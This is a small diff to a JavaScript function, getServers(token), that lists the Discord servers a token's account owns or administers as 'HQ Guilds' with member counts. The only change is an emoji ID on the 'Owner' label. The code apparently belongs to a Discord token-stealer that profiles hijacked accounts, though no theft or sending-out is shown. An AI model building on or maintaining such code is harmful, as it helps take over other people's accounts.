@@ -326,7 +326,7 @@ const getServers = async token => {
         if (message === "") {
             message += "**HQ Guilds:**\n";
         }
-        const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";
+        const ownerOrAdmin = guild.owner ? "<:SA_Owner:1472023208961118331> Owner" : "<:admin:967851956930482206> Admin";
         const members = guild.approximate_member_count ?? 0;
         message += `${ownerOrAdmin} | \`${guild.name} - Members: ${members}\`\n`;
     }
